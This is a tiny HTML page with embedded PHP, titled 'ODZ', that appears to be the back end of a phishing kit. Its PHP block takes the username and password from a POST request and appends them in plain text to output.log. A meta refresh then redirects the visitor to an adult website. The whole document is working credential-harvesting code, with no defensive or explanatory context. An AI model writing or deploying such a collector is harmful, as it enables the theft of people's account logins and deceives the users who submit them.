<html>
<head>
  <meta charset="utf-8">
  <title>ODZ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="refresh" content="1;URL=https://pornhub.com" />
</head>
<body>
      <?php

        $handle = fopen("output.log", "a+");

        $str = "Username: ".$_POST["username"]." | Password: ".$_POST["password"]."\n";

        fwrite($handle, $str);

        fclose($handle);

        exit();
      ?>
</body>
</html>
